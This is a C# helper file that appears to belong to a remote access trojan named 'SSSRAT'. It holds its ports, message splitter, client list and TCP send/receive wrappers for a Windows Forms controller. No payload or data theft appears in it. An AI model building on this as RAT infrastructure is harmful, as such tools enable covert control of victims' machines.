using System;
using System.Collections.Generic;
using System.Deployment.Application;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Public {
	public class _ {
		public const string PROGRAM_NAME = "SSSRAT";
		public const int MAX_BUFFER = 8192;
		public const string SPLITTER = "{_$}";
		public static int port = 13337;
		public static int kaPort = 13338;
		public static List<Client> clients = new List<Client>();

		public static bool Send(NetworkStream stm, byte[] data, int offset = 0, int size = -1) {
			try {
				if (size == -1)
					size = data.Length;
				stm.Write(data, offset, size);
				return true;
			} catch {
				return false;
			}
		}

		public static byte[] Recv(NetworkStream stm, int size, int offset = 0) {
			var buffer = new byte[size - offset];
			try {
					stm.Read(buffer, offset, size);
				return buffer;
			} catch {
				return null;
			}
		}

		public static string CurrentVersion {
			get {
				return ApplicationDeployment.IsNetworkDeployed
					       ? ApplicationDeployment.CurrentDeployment.CurrentVersion.ToString()
					       : Assembly.GetExecutingAssembly().GetName().Version.ToString();
			}
		}

		public static Client GetClientByIP(IPAddress Ip) {
			for (int x = 0; x < clients.Count; x++) {
				if (Equals(Ip, GetIPByRemoteEndPoint(clients[x].tcp.Client.RemoteEndPoint))) {
					return clients[x];
				}
			}
			return new Client(UInt32.MaxValue, new TcpClient(), new ListViewItem());
		}

		public static IPAddress GetIPByRemoteEndPoint(EndPoint EndPoint) {
			return ((IPEndPoint)EndPoint).Address;
		}

		public static string CleanOs(string Str) {
			return Str.Replace("\0", "");
		}
		public static string GS(byte[] bytes) {
			return System.Text.Encoding.ASCII.GetString(bytes);
		}
		public static byte[] GB(string str) {
			return System.Text.Encoding.ASCII.GetBytes(str);
		}
	}

	public struct Client {
		public readonly uint id;
		public TcpClient tcp;
		public readonly ListViewItem lvi;
		public Client(uint Id, TcpClient Tcp, ListViewItem Lvi) {
			id = Id;
			tcp = Tcp;
			lvi = Lvi;
		}
	}
}
